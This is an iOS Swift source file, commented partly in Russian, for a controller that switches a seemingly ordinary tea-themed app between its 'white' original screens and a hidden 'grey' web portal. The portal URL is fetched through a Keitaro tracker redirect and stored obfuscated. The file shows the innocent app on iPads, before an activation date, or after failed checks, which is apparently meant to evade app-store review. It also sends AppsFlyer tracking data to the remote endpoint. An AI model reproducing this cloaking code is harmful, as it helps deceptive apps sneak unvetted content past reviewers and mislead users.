import Foundation
import Combine
import UIKit
import StoreKit
import AppsFlyerLib

// MARK: - Chai Flow Controller
// Контроллер потоков для управления серой частью
class ChaiFlowController: ObservableObject {
    static let shared = ChaiFlowController()
    
    @Published var chaiDisplayMode: ChaiDisplayState = .preparing
    @Published var chaiCachedEndpoint: String? = nil
    @Published var chaiIsLoading = true
    
    // Flag to prevent URL updates after fetching new URL
    private var chaiIsRefreshingFromRemote = false
    
    private let chaiRemoteConfigEndpoint = "https://networking-guide.com/Z3CX5tKl"
    
    // Уникальные ключи для проекта
    private let chaiPersistentStateKey = "chai_persistent_state_v1"
    private let chaiSecuredEndpointKey = "chai_secured_endpoint_v1"
    private let chaiExtractedIdentifierKey = "chai_extracted_id_v1"
    private let chaiWebViewShownKey = "chai_webview_shown"
    private let chaiRatingShownKey = "chai_rating_shown"
    private let chaiDateCheckKey = "chai_date_check"
    
    // AppsFlyer UID
    private var chaiAppsFlyerUID: String = ""
    private var chaiAppsFlyerConversionData: [AnyHashable: Any] = [:]
    
    private var chaiSavedPathId: String? {
        get { UserDefaults.standard.string(forKey: chaiExtractedIdentifierKey) }
        set { UserDefaults.standard.set(newValue, forKey: chaiExtractedIdentifierKey) }
    }
    
    private var chaiFallbackState: Bool {
        get { UserDefaults.standard.bool(forKey: chaiPersistentStateKey) }
        set { UserDefaults.standard.set(newValue, forKey: chaiPersistentStateKey) }
    }
    
    private var chaiWebViewShown: Bool {
        get { UserDefaults.standard.bool(forKey: chaiWebViewShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: chaiWebViewShownKey) }
    }
    
    private var chaiRatingShown: Bool {
        get { UserDefaults.standard.bool(forKey: chaiRatingShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: chaiRatingShownKey) }
    }
    
    private init() {
        // Initialize published property from secure storage
        self.chaiCachedEndpoint = chaiSecureRetrieveEndpoint()
        
        // НЕ получаем UID здесь - ждём ATT и conversion data от AppsFlyer
        // self.chaiAppsFlyerUID будет установлен в chaiUpdateAppsFlyerData()
        
        // Run initialization sequence с задержкой для ATT
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.chaiRunInitializationSequence()
        }
    }
    
    // MARK: - Initialization Sequence
    private func chaiRunInitializationSequence() {
        chaiPerformInitialValidations()
    }
    
    private func chaiPerformInitialValidations() {
        // Check 1: Device type
        guard chaiValidateDeviceType() else { return }
        
        // Check 2: Temporal condition
        guard chaiValidateTemporalCondition() else { return }
        
        // Check 3: Persistent state (fallback = white навсегда)
        guard chaiCheckPersistentState() else { return }
        
        // Check 4: Cached endpoint - если есть, показываем WebView сразу
        if let endpoint = chaiSecureRetrieveEndpoint(), !endpoint.isEmpty {
            chaiActivatePrimaryMode()
            chaiValidateEndpointInBackground(endpoint)
            return
        }
        
        // Check 5: Если нет cached endpoint - НЕ делаем запрос здесь!
        // Ждём conversion data от AppsFlyer в chaiUpdateAppsFlyerData()
        print("⏳ [ChaiFlowController] No cached endpoint - waiting for AppsFlyer conversion data...")
        
        // Но если AppsFlyer не отвечает долго (10 сек), делаем запрос без данных
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
            guard let self = self else { return }
            
            // Проверяем что мы всё ещё ждём (не было conversion data)
            if self.chaiDisplayMode == .preparing && !self.chaiFallbackState && !self.chaiWebViewShown {
                print("⚠️ [ChaiFlowController] AppsFlyer timeout - making request without conversion data")
                
                // Получаем UID (к этому моменту ATT точно уже отработал)
                self.chaiAppsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
                print("🔑 [ChaiFlowController] UID after timeout: \(self.chaiAppsFlyerUID), length: \(self.chaiAppsFlyerUID.count)")
                
                self.chaiFetchRemoteConfiguration()
            }
        }
    }
    
    private func chaiValidateDeviceType() -> Bool {
        if UIDevice.current.model == "iPad" {
            chaiActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func chaiValidateTemporalCondition() -> Bool {
        let chaiFormatter = DateFormatter()
        chaiFormatter.dateFormat = "dd.MM.yyyy"
        // Дата активации: 15.01.2025
        if let chaiThreshold = chaiFormatter.date(from: "15.01.2025"),
           Date() < chaiThreshold {
            chaiActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func chaiCheckPersistentState() -> Bool {
        if chaiFallbackState {
            chaiActivateSecondaryMode()
            return false
        }
        return true
    }
    
    // MARK: - URL Management with Obfuscation
    private func chaiSecureStoreEndpoint(_ newValue: String?) {
        guard let chaiEndpoint = newValue else {
            UserDefaults.standard.removeObject(forKey: chaiSecuredEndpointKey)
            print("📝 [ChaiFlowController] Endpoint removed from storage")
            DispatchQueue.main.async { self.chaiCachedEndpoint = nil }
            return
        }
        
        // Обфусцируем перед сохранением
        if let chaiTransformed = ChaiDataProcessor.chaiTransform(chaiEndpoint) {
            UserDefaults.standard.set(chaiTransformed, forKey: chaiSecuredEndpointKey)
            print("📝 [ChaiFlowController] Endpoint transformed and stored")
        } else {
            // FALLBACK: сохраняем как есть если обфускация не удалась
            UserDefaults.standard.set(chaiEndpoint, forKey: chaiSecuredEndpointKey)
            print("⚠️ [ChaiFlowController] Transform failed, storing plain (fallback)")
        }
        
        DispatchQueue.main.async { self.chaiCachedEndpoint = chaiEndpoint }
    }
    
    private func chaiSecureRetrieveEndpoint() -> String? {
        guard let chaiStored = UserDefaults.standard.string(forKey: chaiSecuredEndpointKey) else {
            print("📝 [ChaiFlowController] No endpoint found in storage")
            return nil
        }
        
        // Пытаемся деобфусцировать
        if let chaiRestored = ChaiDataProcessor.chaiRestore(chaiStored) {
            print("📝 [ChaiFlowController] Endpoint restored successfully")
            return chaiRestored
        }
        
        // FALLBACK: проверяем не plain URL ли это
        if chaiStored.hasPrefix("http") {
            print("⚠️ [ChaiFlowController] Using plain stored value (fallback)")
            return chaiStored
        }
        
        print("❌ [ChaiFlowController] Failed to retrieve endpoint")
        return nil
    }
    
    // MARK: - AppFlyer Integration
    func chaiUpdateAppsFlyerData(chaiUid: String, chaiConversionData: [AnyHashable: Any] = [:]) {
        self.chaiAppsFlyerUID = chaiUid
        self.chaiAppsFlyerConversionData = chaiConversionData
        
        // Если chaiFallbackState установлен - НЕ делаем запрос (белая часть навсегда)
        if chaiFallbackState {
            print("⚪ [ChaiFlowController] Fallback state is true - skipping AppsFlyer update")
            return
        }
        
        // Если WebView уже был показан - не меняем состояние
        if chaiWebViewShown {
            print("🌐 [ChaiFlowController] WebView already shown - keeping current state")
            return
        }
        
        // Если еще нет сохраненного URL, делаем запрос к Keitaro с новыми данными
        if chaiCachedEndpoint == nil || chaiCachedEndpoint?.isEmpty == true {
            chaiFetchRemoteConfiguration()
        }
    }
    
    // MARK: - Configuration Fetching
    private func chaiFetchRemoteConfiguration() {
        // Формируем URL с параметрами AppFlyer
        let chaiTargetURL = ChaiURLConstructor.chaiBuildURL(
            chaiAppsFlyerUID: chaiAppsFlyerUID,
            chaiConversionData: chaiAppsFlyerConversionData
        )
        
        print("🔗 [ChaiFlowController] Config URL: \(chaiTargetURL)")
        
        guard let chaiURL = URL(string: chaiTargetURL) else {
            print("❌ [ChaiFlowController] Invalid config URL - showing white mode")
            chaiActivateSecondaryMode()
            return
        }
        
        var chaiRequest = URLRequest(url: chaiURL)
        chaiRequest.timeoutInterval = 10.0
        chaiRequest.httpMethod = "GET"
        
        print("📡 [ChaiFlowController] Making request...")
        
        URLSession.shared.dataTask(with: chaiRequest) { [weak self] chaiData, chaiResponse, chaiError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                // Check for network errors
                if let chaiError = chaiError {
                    print("❌ [ChaiFlowController] Network error: \(chaiError.localizedDescription)")
                    self.chaiActivateSecondaryMode()
                    return
                }
                
                // Check HTTP response
                if let chaiHttpResponse = chaiResponse as? HTTPURLResponse {
                    print("📊 [ChaiFlowController] HTTP Status: \(chaiHttpResponse.statusCode)")
                    print("🔗 [ChaiFlowController] Response URL: \(chaiHttpResponse.url?.absoluteString ?? "nil")")
                    
                    if chaiHttpResponse.statusCode > 403 {
                        print("❌ [ChaiFlowController] HTTP error \(chaiHttpResponse.statusCode) - showing white mode")
                        self.chaiActivateSecondaryMode()
                        return
                    }
                    
                    // Get final URL after redirects
                    if let chaiFinalURL = chaiHttpResponse.url?.absoluteString {
                        print("🎯 [ChaiFlowController] Final URL after redirects: \(chaiFinalURL)")
                        
                        if chaiFinalURL != chaiTargetURL {
                            print("✅ [ChaiFlowController] URL changed after redirect - saving and showing WebView")
                            
                            // Extract and save pathid parameter
                            self.chaiExtractAndSavePathId(from: chaiFinalURL)
                            
                            // Set flag to prevent URL updates from WebView
                            self.chaiIsRefreshingFromRemote = true
                            
                            // Save the final redirected URL
                            self.chaiSecureStoreEndpoint(chaiFinalURL)
                            self.chaiActivatePrimaryMode()
                            
                            // Reset flag after a delay
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.chaiIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [ChaiFlowController] Unexpected response - showing white mode")
                self.chaiActivateSecondaryMode()
            }
        }.resume()
    }
    
    // MARK: - URL Validation
    private func chaiValidateEndpointInBackground(_ chaiUrl: String) {
        print("🔍 [ChaiFlowController] Validating saved URL in background: \(chaiUrl)")
        
        guard let chaiValidationURL = URL(string: chaiUrl) else {
            print("❌ [ChaiFlowController] Invalid saved URL format - fetching new with pathid")
            chaiFetchConfigurationWithPathId()
            return
        }
        
        var chaiValidationRequest = URLRequest(url: chaiValidationURL)
        chaiValidationRequest.timeoutInterval = 10.0
        chaiValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: chaiValidationRequest) { [weak self] _, chaiValidationResponse, chaiValidationError in
            guard let self = self else { return }
            
            if let chaiValidationError = chaiValidationError {
                print("❌ [ChaiFlowController] Validation network error: \(chaiValidationError.localizedDescription)")
                self.chaiFetchConfigurationWithPathId()
                return
            }
            
            if let chaiValidationHttpResponse = chaiValidationResponse as? HTTPURLResponse {
                print("📊 [ChaiFlowController] Validation HTTP Status: \(chaiValidationHttpResponse.statusCode)")
                
                if chaiValidationHttpResponse.statusCode >= 200 && chaiValidationHttpResponse.statusCode <= 403 {
                    print("✅ [ChaiFlowController] Saved URL is valid (status \(chaiValidationHttpResponse.statusCode))")
                    return
                } else if chaiValidationHttpResponse.statusCode > 403 {
                    print("❌ [ChaiFlowController] Saved URL is dead (status \(chaiValidationHttpResponse.statusCode)) - fetching new with pathid")
                    self.chaiFetchConfigurationWithPathId()
                    return
                }
            }
            
            print("❌ [ChaiFlowController] Unexpected validation response - fetching new with pathid")
            self.chaiFetchConfigurationWithPathId()
        }.resume()
    }
    
    // MARK: - Configuration with PathId
    private func chaiFetchConfigurationWithPathId() {
        guard let chaiPathId = chaiSavedPathId, !chaiPathId.isEmpty else {
            print("❌ [ChaiFlowController] No saved pathId - showing empty WebView")
            chaiActivatePrimaryMode()
            return
        }
        
        let chaiUrlWithPathId = "\(chaiRemoteConfigEndpoint)?pathid=\(chaiPathId)"
        print("🔗 [ChaiFlowController] Config URL with pathId: \(chaiUrlWithPathId)")
        
        guard let chaiPathIdURL = URL(string: chaiUrlWithPathId) else {
            print("❌ [ChaiFlowController] Invalid config URL with pathId - showing empty WebView")
            chaiActivatePrimaryMode()
            return
        }
        
        var chaiPathIdRequest = URLRequest(url: chaiPathIdURL)
        chaiPathIdRequest.timeoutInterval = 10.0
        chaiPathIdRequest.httpMethod = "GET"
        
        print("📡 [ChaiFlowController] Making request to Keitaro with pathId...")
        
        URLSession.shared.dataTask(with: chaiPathIdRequest) { [weak self] chaiPathIdData, chaiPathIdResponse, chaiPathIdError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let chaiPathIdError = chaiPathIdError {
                    print("❌ [ChaiFlowController] Network error with pathId: \(chaiPathIdError.localizedDescription)")
                    self.chaiActivatePrimaryMode()
                    return
                }
                
                if let chaiPathIdHttpResponse = chaiPathIdResponse as? HTTPURLResponse {
                    print("📊 [ChaiFlowController] HTTP Status with pathId: \(chaiPathIdHttpResponse.statusCode)")
                    
                    if chaiPathIdHttpResponse.statusCode > 403 {
                        print("❌ [ChaiFlowController] HTTP error \(chaiPathIdHttpResponse.statusCode) with pathId - showing empty WebView")
                        self.chaiActivatePrimaryMode()
                        return
                    }
                    
                    if let chaiPathIdFinalURL = chaiPathIdHttpResponse.url?.absoluteString {
                        print("🎯 [ChaiFlowController] Final URL after redirects with pathId: \(chaiPathIdFinalURL)")
                        
                        if chaiPathIdFinalURL != chaiUrlWithPathId {
                            print("✅ [ChaiFlowController] URL changed after redirect with pathId - saving and showing WebView")
                            
                            self.chaiIsRefreshingFromRemote = true
                            self.chaiSecureStoreEndpoint(chaiPathIdFinalURL)
                            self.chaiActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.chaiIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [ChaiFlowController] Unexpected response with pathId - showing empty WebView")
                self.chaiActivatePrimaryMode()
            }
        }.resume()
    }
    
    // MARK: - PathId Extraction
    private func chaiExtractAndSavePathId(from chaiUrl: String) {
        guard let chaiUrlComponents = URLComponents(string: chaiUrl),
              let chaiQueryItems = chaiUrlComponents.queryItems else {
            print("⚠️ [ChaiFlowController] Could not parse URL components from: \(chaiUrl)")
            return
        }
        
        for chaiQueryItem in chaiQueryItems {
            if chaiQueryItem.name.lowercased() == "pathid", let chaiPathIdValue = chaiQueryItem.value {
                print("🔑 [ChaiFlowController] Found pathId: \(chaiPathIdValue)")
                chaiSavedPathId = chaiPathIdValue
                return
            }
        }
        
        print("⚠️ [ChaiFlowController] No pathId parameter found in URL: \(chaiUrl)")
    }
    
    // MARK: - Flow States
    private func chaiActivateSecondaryMode() {
        print("⚪ [ChaiFlowController] Setting WHITE mode - showing original app")
        DispatchQueue.main.async {
            self.chaiDisplayMode = .original
            self.chaiFallbackState = true
            self.chaiIsLoading = false
        }
    }
    
    private func chaiActivatePrimaryMode() {
        print("🌐 [ChaiFlowController] Setting WEBVIEW mode - showing portal")
        DispatchQueue.main.async {
            self.chaiDisplayMode = .webContent
            self.chaiIsLoading = false
            
            // Показываем алерт оценки если нужно
            if self.chaiWebViewShown && !self.chaiRatingShown {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                    self.chaiShowSystemRatingAlert()
                }
            }
            
            self.chaiWebViewShown = true
        }
    }
    
    // MARK: - URL Management
    func chaiGetCurrentURL() -> String? {
        return chaiSecureRetrieveEndpoint()
    }
    
    func chaiUpdateURL(_ chaiNewURL: String) {
        print("🔄 [ChaiFlowController] URL update attempt: \(chaiNewURL)")
        
        // Block updates if we're currently updating from remote
        if chaiIsRefreshingFromRemote {
            print("🚫 [ChaiFlowController] Blocking URL update - currently updating from remote")
            return
        }
        
        // Only save if it's different from config URL, not the tracking domain, and not already saved
        if chaiNewURL != chaiRemoteConfigEndpoint && !chaiNewURL.contains("networking-guide.com") && chaiNewURL != chaiGetCurrentURL() {
            print("💾 [ChaiFlowController] Saving new URL: \(chaiNewURL)")
            chaiSecureStoreEndpoint(chaiNewURL)
        } else {
            print("⏭️ [ChaiFlowController] Skipping URL save (tracking domain, same as config, or already saved)")
        }
    }
    
    // MARK: - Rating Alert
    private func chaiShowSystemRatingAlert() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
            if let chaiWindowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                SKStoreReviewController.requestReview(in: chaiWindowScene)
                self.chaiRatingShown = true
            }
        }
    }
    
    // MARK: - Display State
    enum ChaiDisplayState {
        case preparing
        case original
        case webContent
    }
}
